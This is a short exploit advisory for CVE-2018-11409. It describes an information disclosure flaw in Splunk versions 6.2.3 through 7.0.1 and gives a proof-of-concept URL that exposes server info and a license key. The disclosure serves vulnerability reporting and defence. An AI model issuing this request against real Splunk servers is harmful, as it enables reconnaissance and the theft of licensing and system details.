# splunk
# Exploit Title: [information disclosure]
# Google Dork: [n/r]
# Date: [23/05/2018]
# Exploit Author: [KoF2002]
# Vendor Homepage: [https://www.splunk.com/]
# Software Link: []
# Version: [6.2.3 - 7.01 MAYBE ALL VERSION AFFECTED] 
# Tested on: [linux os]
# CVE : [CVE-2018-11409]
# [Attack Type] [Remote]

------------------------------------------------------

 Splunk through 6.2.3 7.0.1 allows information disclosure by appending

/__raw/services/server/info/server-info?output_mode=json to a query,

as demonstrated by discovering a license key and other information.


PoC :

https://127.0.0.1:8000/en-US/splunkd/__raw/services/server/info/server-info?output_mode=json

--------------------------------------

Greats : Cold z3ro , ihab pal and all HTLovers "We Are Back"

https://www.0x30.cc/core/
